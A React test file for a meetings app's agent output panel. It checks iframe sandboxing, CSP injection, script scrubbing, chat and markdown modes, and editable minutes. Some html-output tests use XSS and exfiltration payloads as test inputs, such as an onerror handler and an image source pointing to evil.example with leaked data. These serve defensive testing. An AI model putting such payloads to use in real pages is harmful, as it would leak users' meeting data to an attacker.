// The per-agent output panel.
//
// The HTML mode carries two load-bearing assertions, because one control is not
// enough. That document is model-generated from meeting transcript, so:
//
//   1. It renders in a `srcDoc` frame with `allow-scripts` but deliberately
//      WITHOUT `allow-same-origin` — the pair is what gives the frame a null
//      origin, so its scripts cannot reach this page, its cookies, or the
//      gateway. Adding `allow-same-origin` would silently defeat that.
//   2. A null origin blocks READING this page and does nothing about outbound
//      requests, so the srcdoc must also carry the egress-denying CSP that
//      `buildSketchSrcdoc` prepends. Rendering `output` raw was the BLOCKING
//      finding; the wiring test below is what stops it coming back.
//   3. And the CSP alone was not enough either: it grants `script-src
//      'unsafe-inline'`, so the model's own `<script>` ran in the frame and could
//      stream the transcript out over DNS-prefetch lookups no CSP governs.
//      `buildSketchSrcdoc` now strips the model's scripts and event handlers.
//
// The CSP's own content, and the scrub in both directions (nothing executable
// survives / Mermaid and tables still render), are asserted in
// sketchSrcdoc.test.ts. This file only pins the WIRING — that the panel routes
// `output` through that builder instead of handing it to `srcDoc` raw.

import { describe, it, expect, vi, afterEach } from 'vitest'
import { render, screen, fireEvent, cleanup, act, within } from '@testing-library/react'
import { readFileSync } from 'node:fs'

import AgentPanel from '../apps/meetings/components/AgentPanel'
import type { AgentDef } from '../apps/meetings/api'
import { MERMAID_RUNTIME_PATH } from '../lib/vendorPaths'
import EN_CATALOG from '../i18n/locales/en.json'

// Read as source, not imported: these assertions are about the SHAPE of the call
// (which cache operation, which HTTP method) rather than its result, and the same
// pattern used by the surrounding meetings wiring tests.
const SessionSource = readFileSync('src/apps/meetings/hooks/useMeetingSession.ts', 'utf-8')
const ViewSource = readFileSync('src/apps/meetings/MeetingView.tsx', 'utf-8')

const MARKDOWN: AgentDef = { id: 'note-taker', name: 'Note Taker', widget_type: 'markdown' }
const HTML: AgentDef = { id: 'sketch-artist', name: 'Sketch Artist', widget_type: 'html' }
const CHAT: AgentDef = { id: 'helper', name: 'Helper', widget_type: 'chat' }

function mount(agent: AgentDef, overrides: Partial<React.ComponentProps<typeof AgentPanel>> = {}) {
  const props: React.ComponentProps<typeof AgentPanel> = {
    agent,
    output: '',
    listening: true,
    chatView: false,
    onToggleListening: vi.fn(),
    onToggleChatView: vi.fn(),
    onSendMessage: vi.fn(),
    ...overrides,
  }
  return { props, ...render(<AgentPanel {...props} />) }
}

function deferred() {
  let resolve!: () => void
  const promise = new Promise<void>(done => {
    resolve = done
  })
  return { promise, resolve }
}

afterEach(cleanup)

describe('AgentPanel — html output', () => {
  it('renders the document in a null-origin sandboxed iframe', () => {
    const { container } = mount(HTML, { output: '<h1>Architecture</h1>' })
    const frame = container.querySelector('iframe')!
    expect(frame.getAttribute('srcdoc')).toContain('Architecture')
    const sandbox = frame.getAttribute('sandbox')!
    expect(sandbox).toContain('allow-scripts')
    // Combining allow-scripts with allow-same-origin removes the sandbox's whole
    // point — the frame could then script this document.
    expect(sandbox).not.toContain('allow-same-origin')
  })

  it('never injects the model document into this page', () => {
    const { container } = mount(HTML, {
      output: '<img id="pwn" src="data:," onerror="stolen()">',
    })
    // The payload must exist ONLY as an iframe attribute, never as live DOM here:
    // no <img> in THIS tree means nothing of the model document was mounted.
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('#pwn')).toBeNull()
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    // It did reach the frame — this is a handoff, not a drop.
    expect(srcdoc).toContain('id="pwn"')
    // And the handler was removed on the way. This assertion used to read
    // `toContain('onerror')`: at the time, keeping the handler was harmless
    // BECAUSE it only ever lived in a sandboxed frame. It is now stripped by
    // buildSketchSrcdoc's scrub (an `onerror` is script, and model script in that
    // frame was the DNS-exfiltration finding), so the polarity flips — the frame
    // never sees it at all, which is strictly stronger than what was asserted
    // before.
    expect(srcdoc).not.toContain('onerror')
    expect(srcdoc).not.toContain('stolen')
  })

  it('shows a placeholder before any output arrives', () => {
    const { container } = mount(HTML)
    expect(container.querySelector('iframe')).toBeNull()
    expect(screen.getByText('Sketch Artist output will appear here.')).toBeTruthy()
  })

  it('gives the frame an accessible title', () => {
    const { container } = mount(HTML, { output: '<p>x</p>' })
    expect(container.querySelector('iframe')!.getAttribute('title')).toContain('Sketch Artist')
  })

  it('gives the frame its own compositing layer so a skipped first paint cannot blank it', () => {
    // Same mechanism and remedy as the dashboard's sandbox-doc frames (#7931):
    // without layer promotion an engine can lay the document out, run its
    // scripts and report a correct height while rasterizing nothing — a
    // correctly sized, visible frame painting an empty box, silent by
    // construction. This frame builds its document inline via srcDoc and never
    // reaches the sandbox-doc mint, so it sat outside that PR's scope (#8037).
    // Chromium in this DOM paints fine either way, so removing the property
    // looks completely harmless here: this assertion is the whole guard.
    const { container } = mount(HTML, { output: '<h1>promoted</h1>' })
    const frame = container.querySelector('iframe') as HTMLIFrameElement
    expect(frame.style.transform).toBe('translateZ(0)')
    // The promotion is additive: the fixed sizing that reserves the panel's
    // box must survive alongside it.
    expect(frame.style.height).toBe('340px')
    expect(frame.style.minHeight).toBe('340px')
  })

  it('never hands the model document to srcDoc raw — it goes through buildSketchSrcdoc', () => {
    // This is the BLOCKING finding, as a test. The vulnerable version set
    // srcDoc={output} directly, so the srcdoc equalled the model HTML exactly
    // and carried no policy at all.
    const { container } = mount(HTML, { output: '<h1>Architecture</h1>' })
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    expect(srcdoc).not.toBe('<h1>Architecture</h1>')
    expect(srcdoc).toContain('Content-Security-Policy')
    // The two directives that close the exfiltration channel.
    expect(srcdoc).toContain("connect-src 'none'")
    expect(srcdoc).toContain('img-src data:;')
    // ...and the model content still renders.
    expect(srcdoc).toContain('<h1>Architecture</h1>')
  })

  it('puts the policy ahead of the model HTML, and grants img-src no https:', () => {
    // A <meta> CSP binds only from where it is parsed, so an <img> allowed to
    // parse first would fire under no policy. The reported repro is exactly an
    // HTTPS image URL.
    const { container } = mount(HTML, {
      output: '<img id="pwn" src="https://evil.example/?d=leak">',
    })
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    expect(srcdoc.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc.indexOf('id="pwn"'))
    const imgSrc = srcdoc.match(/img-src ([^;]*);/)![1]
    expect(imgSrc).not.toContain('https:')
    expect(imgSrc).not.toContain('*')
  })

  it('serves Mermaid from our own origin so the frame needs no network', () => {
    const { container } = mount(HTML, { output: '<div class="mermaid">graph TD;A-->B</div>' })
    const srcdoc = container.querySelector('iframe')!.getAttribute('srcdoc')!
    expect(srcdoc).toContain(`${window.location.origin}${MERMAID_RUNTIME_PATH}`)
    // script-src is pinned to that one FILE, never to the bare origin (a script
    // URL is an egress channel too).
    expect(srcdoc).toContain(
      `script-src 'unsafe-inline' ${window.location.origin}${MERMAID_RUNTIME_PATH};`,
    )
  })
})

describe('AgentPanel — markdown output', () => {
  it('renders the notes', () => {
    mount(MARKDOWN, { output: '# Standup\n\nDecided to ship' })
    expect(screen.getByText('Decided to ship')).toBeTruthy()
  })

  it('offers the chat toggle', () => {
    const onToggleChatView = vi.fn()
    mount(MARKDOWN, { onToggleChatView })
    fireEvent.click(screen.getByLabelText('Show chat'))
    expect(onToggleChatView).toHaveBeenCalled()
  })

  it('reports a listening toggle', () => {
    const onToggleListening = vi.fn()
    mount(MARKDOWN, { onToggleListening, listening: true })
    fireEvent.click(screen.getByLabelText('Mute Note Taker'))
    expect(onToggleListening).toHaveBeenCalled()
  })

  it('labels the control by what it will DO, not by the current state', () => {
    mount(MARKDOWN, { listening: false })
    expect(screen.getByLabelText('Unmute Note Taker')).toBeTruthy()
  })
})

describe('AgentPanel — chat mode', () => {
  it('a chat-type agent has no output/chat toggle', () => {
    mount(CHAT)
    expect(screen.queryByLabelText('Show chat')).toBeNull()
    expect(screen.queryByLabelText('Show output')).toBeNull()
  })

  it('sends a message and echoes it locally', () => {
    const onSendMessage = vi.fn()
    mount(CHAT, { onSendMessage })
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: 'add the decision log' } })
    fireEvent.keyDown(input, { key: 'Enter' })
    expect(onSendMessage).toHaveBeenCalledWith('add the decision log')
    expect(input.value).toBe('')
    expect(screen.getByText('add the decision log')).toBeTruthy()
  })

  it('refuses an empty message', () => {
    const onSendMessage = vi.fn()
    mount(CHAT, { onSendMessage })
    fireEvent.keyDown(screen.getByRole('textbox'), { key: 'Enter' })
    expect(onSendMessage).not.toHaveBeenCalled()
  })

  it('a markdown agent in chat view shows the chat surface', () => {
    mount(MARKDOWN, { chatView: true, output: '# ignored while chatting' })
    expect(screen.getByRole('textbox')).toBeTruthy()
    expect(screen.getByLabelText('Show output')).toBeTruthy()
  })
})
// ── editable minutes ────────────────────────────────────────────────────────
//
// The user's edit of an agent's output. The panel shows ONE copy — an edit wins
// server-side, so `output` is already whatever belongs on screen — which means
// everything worth testing here is about the two things a reader cannot otherwise
// tell, and the one thing that would lose their work:
//
//   * that they are looking at their own text rather than the agent's ("Edited");
//   * that the agent has written more since ("stale");
//   * that the 5-second outputs poll cannot type over an open draft.
//
// The last is the one that bites. The draft is local state seeded when edit mode
// opens, and `rerenders under an open editor` is what pins that.

const EDITABLE = EN_CATALOG.apps.meetings.agentPanel

function mountEditable(
  overrides: Partial<React.ComponentProps<typeof AgentPanel>> = {},
) {
  const onSaveOutput = vi.fn(async () => undefined)
  const onRevertOutput = vi.fn()
  const props: React.ComponentProps<typeof AgentPanel> = {
    agent: MARKDOWN,
    output: '# Generated\n\nby the agent',
    listening: true,
    chatView: false,
    onToggleListening: vi.fn(),
    onToggleChatView: vi.fn(),
    onSendMessage: vi.fn(),
    onSaveOutput,
    onRevertOutput,
    ...overrides,
  }
  const view = render(<AgentPanel {...props} />)
  const openEditor = () => {
    fireEvent.click(screen.getByLabelText(EDITABLE.edit))
    return screen.getByLabelText('Note Taker output, editable') as HTMLTextAreaElement
  }
  return { ...view, props, onSaveOutput, onRevertOutput, openEditor }
}

describe('AgentPanel — editable minutes', () => {
  it('offers no edit affordance when the output is not editable', () => {
    // The ABSENCE of the callback is what disables it, so an html or chat agent
    // gets no button even though the panel component is the same one.
    mount(HTML, { output: '<p>x</p>' })
    expect(screen.queryByLabelText(EDITABLE.edit)).toBeNull()
    cleanup()
    mount(CHAT)
    expect(screen.queryByLabelText(EDITABLE.edit)).toBeNull()
  })

  it('seeds the editor with what is currently on screen', () => {
    const { openEditor } = mountEditable()
    expect(openEditor().value).toBe('# Generated\n\nby the agent')
  })

  it('gives the editor a name distinct from the panel title', () => {
    // The region and the control are different things, and one shared name makes
    // them indistinguishable to a screen reader.
    const { openEditor } = mountEditable()
    expect(openEditor().getAttribute('aria-label')).not.toBe('Note Taker')
  })

  it('saves the draft and closes the editor', async () => {
    const { openEditor, onSaveOutput } = mountEditable()
    const field = openEditor()
    fireEvent.change(field, { target: { value: '# Mine\n' } })
    await act(async () => {
      fireEvent.click(screen.getByText(EDITABLE.save))
    })
    expect(onSaveOutput).toHaveBeenCalledWith('# Mine\n')
    expect(screen.queryByLabelText('Note Taker output, editable')).toBeNull()
  })

  it('keeps the draft open when saving fails', async () => {
    const onSaveOutput = vi.fn(async () => {
      throw new Error('offline')
    })
    const { openEditor } = mountEditable({ onSaveOutput })
    fireEvent.change(openEditor(), { target: { value: '# Still mine\n' } })

    await act(async () => {
      fireEvent.click(screen.getByText(EDITABLE.save))
    })

    expect(onSaveOutput).toHaveBeenCalledWith('# Still mine\n')
    expect((screen.getByLabelText('Note Taker output, editable') as HTMLTextAreaElement).value)
      .toBe('# Still mine\n')
  })

  it('keeps text typed while the submitted save is in flight', async () => {
    const pending = deferred()
    const onSaveOutput = vi.fn(() => pending.promise)
    const { openEditor } = mountEditable({ onSaveOutput })
    const field = openEditor()
    fireEvent.change(field, { target: { value: '# Submitted\n' } })

    fireEvent.click(screen.getByText(EDITABLE.save))
    expect(onSaveOutput).toHaveBeenCalledWith('# Submitted\n')
    fireEvent.change(field, { target: { value: '# Submitted\n\nTyped while saving' } })

    await act(async () => {
      pending.resolve()
      await pending.promise
    })

    expect((screen.getByLabelText('Note Taker output, editable') as HTMLTextAreaElement).value)
      .toBe('# Submitted\n\nTyped while saving')
  })

  it('cancelling discards the draft and never calls the server', () => {
    const { openEditor, onSaveOutput } = mountEditable()
    fireEvent.change(openEditor(), { target: { value: 'scratch' } })
    fireEvent.click(screen.getByText(EDITABLE.cancel))
    expect(onSaveOutput).not.toHaveBeenCalled()
    // Reopening starts from the agent's text again, not from the abandoned draft.
    expect(screen.getByLabelText(EDITABLE.edit)).toBeTruthy()
  })

  it('a poll landing under an open editor does not overwrite the draft', () => {
    // The failure this prevents: the outputs query refetches every few seconds
    // during a live meeting, so a `value={output}` editor would lose a sentence
    // mid-typing. The draft is seeded once, on open.
    const props: React.ComponentProps<typeof AgentPanel> = {
      agent: MARKDOWN,
      output: '# Generated\n',
      listening: true,
      chatView: false,
      onToggleListening: vi.fn(),
      onToggleChatView: vi.fn(),
      onSendMessage: vi.fn(),
      onSaveOutput: vi.fn(async () => undefined),
      onRevertOutput: vi.fn(),
    }
    const { rerender } = render(<AgentPanel {...props} />)
    fireEvent.click(screen.getByLabelText(EDITABLE.edit))
    const field = screen.getByLabelText('Note Taker output, editable') as HTMLTextAreaElement
    fireEvent.change(field, { target: { value: 'half a sentence' } })

    rerender(<AgentPanel {...props} output="# Generated\n\nthe agent added more" />)

    expect(
      (screen.getByLabelText('Note Taker output, editable') as HTMLTextAreaElement).value,
    ).toBe('half a sentence')
  })

  it('hides the chat toggle while editing, so a draft cannot be unmounted away', () => {
    const { openEditor } = mountEditable()
    expect(screen.getByLabelText('Show chat')).toBeTruthy()
    openEditor()
    expect(screen.queryByLabelText('Show chat')).toBeNull()
  })

  it('marks an edited panel, and only an edited one', () => {
    mount(MARKDOWN, { output: '# Generated\n', onSaveOutput: vi.fn() })
    expect(screen.queryByText(EDITABLE.edited)).toBeNull()
    cleanup()
    mountEditable({ edit: { stale: false } })
    expect(screen.getByText(EDITABLE.edited)).toBeTruthy()
  })

  it('keeps the header to two actions and labels the separate edit action row', () => {
    const { container } = mountEditable({ edit: { stale: false } })
    const card = container.firstElementChild as HTMLElement
    const header = card.children[0] as HTMLElement
    const editActions = card.children[1] as HTMLElement

    expect(within(header).getAllByRole('button')).toHaveLength(2)
    const actionButtons = within(editActions).getAllByRole('button')
    expect(actionButtons).toHaveLength(2)
    expect(actionButtons.map(button => button.textContent)).toEqual([
      EDITABLE.edit,
      EDITABLE.revert,
    ])
  })

  it('says so when the agent has written more since the edit', () => {
    // Without this the panel looks like the agent simply stopped working.
    mountEditable({ edit: { stale: true } })
    expect(screen.getByText(/has written more since you edited this/)).toBeTruthy()
  })

  it('stays quiet when the edit is the newer copy', () => {
    mountEditable({ edit: { stale: false } })
    expect(screen.queryByText(/has written more since you edited this/)).toBeNull()
  })

  it('confirms before reverting, and offers no revert when there is nothing to discard', async () => {
    mountEditable()
    expect(screen.queryByLabelText(EDITABLE.revert)).toBeNull()
    cleanup()
    const { onRevertOutput } = mountEditable({
      edit: { stale: true },
    })
    fireEvent.click(screen.getByLabelText(EDITABLE.revert))

    expect(onRevertOutput).not.toHaveBeenCalled()
    const dialog = screen.getByRole('dialog')
    expect(within(dialog).getByText(/Discard my edits and show what Note Taker wrote/))
      .toBeTruthy()
    await act(async () => {
      fireEvent.click(within(dialog).getByRole('button', { name: EDITABLE.revert }))
    })
    expect(onRevertOutput).toHaveBeenCalled()
  })

  it('keeps the edit when revert confirmation is cancelled', async () => {
    const { onRevertOutput } = mountEditable({ edit: { stale: false } })
    fireEvent.click(screen.getByLabelText(EDITABLE.revert))

    const dialog = screen.getByRole('dialog')
    await act(async () => {
      fireEvent.click(within(dialog).getByRole('button', { name: 'Cancel' }))
    })

    expect(onRevertOutput).not.toHaveBeenCalled()
    expect(screen.getByText(EDITABLE.edited)).toBeTruthy()
  })

  it('disables the editor controls while a save is in flight', () => {
    // Cancel is disabled too, not just Save: it discards the draft, so letting it
    // fire mid-request would throw away text whose fate is still unknown.
    const { openEditor } = mountEditable({ editSaving: true })
    openEditor()
    expect((screen.getByText(EDITABLE.save) as HTMLButtonElement).disabled).toBe(true)
    expect((screen.getByText(EDITABLE.cancel) as HTMLButtonElement).disabled).toBe(true)
  })

  it('leaves the editor controls live when nothing is in flight', () => {
    const { openEditor } = mountEditable()
    openEditor()
    expect((screen.getByText(EDITABLE.save) as HTMLButtonElement).disabled).toBe(false)
    expect((screen.getByText(EDITABLE.cancel) as HTMLButtonElement).disabled).toBe(false)
  })

  it('disables revert while a write is in flight', () => {
    mountEditable({
      edit: { stale: true },
      editSaving: true,
    })
    expect((screen.getByLabelText(EDITABLE.revert) as HTMLButtonElement).disabled).toBe(true)
  })
})

describe('editable minutes — wiring', () => {
  it('the session hook refetches after a write instead of seeding the cache', () => {
    // After a save the interesting question is what the other writer has been
    // doing, and the response cannot answer it: `stale` is computed against a
    // generated file the agent may have rewritten in the meantime.
    const save = SessionSource.slice(
      SessionSource.indexOf('const editOutputMutation'),
      SessionSource.indexOf('const revertOutputMutation'),
    )
    expect(save).toContain('invalidateQueries')
    expect(save).not.toContain('setQueryData')
    expect(SessionSource).toContain('editOutputMutation.mutateAsync')
  })

  it('the view withholds the edit callback from a non-markdown agent', () => {
    // Belt-and-braces with the server's own 409: a button that could only fail
    // should not be on screen.
    expect(ViewSource).toContain("agent.widget_type === 'markdown'")
    expect(ViewSource).toContain('onSaveOutput={')
  })

})

describe('AgentPanel — markdown output pane scrolling (#7664)', () => {
  it('scrolls the notes on an element that does not carry the card-glow clip', () => {
    const { container } = mount(MARKDOWN, {
      output: '# Notes\n\n' + 'A line of meeting notes.\n\n'.repeat(120),
    })
    const scrollers = Array.from(container.querySelectorAll('.overflow-y-auto'))
    expect(scrollers.length).toBeGreaterThan(0)
    for (const el of scrollers) {
      // index.css declares `.card-glow { overflow: hidden }` AFTER
      // @tailwind utilities, and Card unconditionally prepends card-glow. On the
      // SAME element the clip beats `overflow-y-auto` (equal specificity, later
      // source order; twMerge cannot resolve a conflict with a hand-written
      // class), so the pane clipped at its max height with no scroller — the
      // app-wide bug in #7664. The scroll container must never be the card-glow
      // element itself.
      expect(el.classList.contains('card-glow')).toBe(false)
    }
    // The scroller caps its height (so overflow actually engages) and contains
    // the rendered notes (so it is the output pane that scrolls, not some
    // unrelated element).
    const pane = scrollers.find(el => /max-h-\[/.test(el.className))
    expect(pane).toBeTruthy()
    expect(pane!.textContent).toContain('Notes')
    expect(pane!.getAttribute('data-testid')).toBe('agent-output-pane')
    // The pane must still live INSIDE a card-glow Card — the fix moves the
    // scroller inward, it does not detach the pane from the Card. If this
    // relationship breaks, the class-separation assertions above go vacuous.
    const card = pane!.closest('.card-glow')
    expect(card).not.toBeNull()
    // And no ancestor BETWEEN the pane and the Card may re-impose a clip: a
    // wrapper gaining overflow-hidden would clip the scroller exactly the way
    // card-glow clipped the Card, and the per-element checks above would not
    // see it. (The Card itself keeps card-glow's overflow:hidden by design —
    // that is the glow treatment this fix deliberately leaves intact.)
    for (let el = pane!.parentElement; el && el !== card; el = el.parentElement) {
      expect(el.classList.contains('overflow-hidden')).toBe(false)
      expect(el.classList.contains('card-glow')).toBe(false)
    }
  })
})
